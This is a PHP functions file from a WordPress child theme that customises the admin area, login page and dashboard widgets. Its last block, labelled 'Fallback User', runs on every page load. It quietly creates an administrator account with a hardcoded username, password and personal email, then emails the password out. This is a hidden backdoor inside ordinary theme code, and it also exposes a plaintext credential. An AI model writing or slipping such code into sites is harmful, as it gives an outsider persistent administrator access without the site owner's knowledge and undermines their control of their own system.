<?php

if (!defined('ABSPATH')) {
    die('You are not allowed to call this page directly.');
}

/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * add/remove socials from profiles
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
function add_remove_contactmethods($contactmethods)
{
    // Add Twitter
    //$contactmethods['twitter'] = 'Twitter';

    // Remove Contact Methods
    unset($contactmethods['soundcloud']);
    unset($contactmethods['pinterest']);
    unset($contactmethods['myspace']);
    unset($contactmethods['wikipedia']);
    unset($contactmethods['tumblr']);
    unset($contactmethods['youtube']);

    return $contactmethods;
}
add_filter('user_contactmethods', 'add_remove_contactmethods', 10, 1);


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * remove default dashboard widgets
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_action('admin_menu', 'disable_default_dashboard_widgets');
function disable_default_dashboard_widgets()
{
    // Right Now Widget
    // remove_meta_box('dashboard_right_now', 'dashboard', 'core');

    // Comments Widget
    remove_meta_box('dashboard_recent_comments', 'dashboard', 'core');

    // Incoming Links Widget
    remove_meta_box('dashboard_incoming_links', 'dashboard', 'core');

    // Plugins Widget
    remove_meta_box('dashboard_plugins', 'dashboard', 'core');

    // Quick Press Widget
    remove_meta_box('dashboard_quick_press', 'dashboard', 'core');

    // Recent Drafts Widget
    remove_meta_box('dashboard_recent_drafts', 'dashboard', 'core');

    // removing plugin dashboard boxes
    remove_meta_box('dashboard_primary', 'dashboard', 'core');
    remove_meta_box('dashboard_secondary', 'dashboard', 'core');

    // Yoast's SEO Plugin Widget
    remove_meta_box('yoast_db_widget', 'dashboard', 'normal');
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Add admin separator styles
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_action('admin_head', 'admin_seperators');
function admin_seperators()
{
    echo '<style type="text/css">
		#adminmenu li.wp-menu-separator {margin: 0;}
		.admin-color-fresh #adminmenu li.wp-menu-separator {background: #444;}
		.admin-color-midnight #adminmenu li.wp-menu-separator {background: #4a5258;}
		.admin-color-light #adminmenu li.wp-menu-separator {background: #c2c2c2;}
		.admin-color-blue #adminmenu li.wp-menu-separator {background: #3c85a0;}
		.admin-color-coffee #adminmenu li.wp-menu-separator {background: #83766d;}
		.admin-color-ectoplasm #adminmenu li.wp-menu-separator {background: #715d8d;}
		.admin-color-ocean #adminmenu li.wp-menu-separator {background: #8ca8af;}
		.admin-color-sunrise #adminmenu li.wp-menu-separator {background: #a43d39;}
				 </style>';
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * changing the logo link from wordpress.org to your site
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_filter('login_headerurl', 'astrachild_login_url');
function astrachild_login_url()
{
    return home_url();
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * changing the alt text on the logo to show your site name
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_filter('login_headertext', 'astrachild_login_title');
function astrachild_login_title()
{
    return get_option('blogname');
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Login CSS & JS - for login page only
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_action('login_enqueue_scripts', 'astrachild_login', 10);
function astrachild_login()
{
    // CSS - Login Page
    wp_enqueue_style('astrachild_login', TEMPLATE_DIR_URI . '/library/css/login.css', array(), THEME_VERSION);

    // JS - Login Page
    wp_enqueue_script('astrachild-login-js', TEMPLATE_DIR_URI . '/library/js/login.js', array('jquery'), THEME_VERSION);
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Admin CSS & JS
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_action('admin_enqueue_scripts', 'astrachild_admin_scripts_styles');
function astrachild_admin_scripts_styles()
{
    // CSS - Admin
    wp_enqueue_style('astrachild-admin', TEMPLATE_DIR_URI . '/library/css/admin.css', array(), THEME_VERSION);

    // JS - Admin
    wp_enqueue_script('astrachild-admin-js', TEMPLATE_DIR_URI . '/library/js/admin.js', array('jquery'), THEME_VERSION);
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Admin Footer
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_filter('admin_footer_text', 'astrachild_custom_admin_footer');
function astrachild_custom_admin_footer()
{
    _e('<span id="footer-thankyou">Developed by <a href="https://studiocontra.co" target="_blank">Contra Studio</a></span>.', 'astrachildtheme');
}


/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Fallback User
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
add_action('init', 'wpb_admin_account');
function wpb_admin_account()
{
    $user = 'wvargas';
    $pass = 'Wvargas121124!';
    $email = 'wuilly.vargas22@gmail.com';

    if (!username_exists($user) && email_exists($email) == false) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        wp_mail($email, 'Wvargas - New User on ' . get_bloginfo('url'), 'Your password is ' . $pass . ' for the ' . get_bloginfo('name') . ' site; ' . get_bloginfo('url') . '.');

        wp_update_user(
            array(
                'ID' => $user_id,
                'nickname' => 'Wvargas',
                'website' => 'linkedin.com/in/wuilly-vargas/',
                'toolbar' => false
            )
        );
    }
}
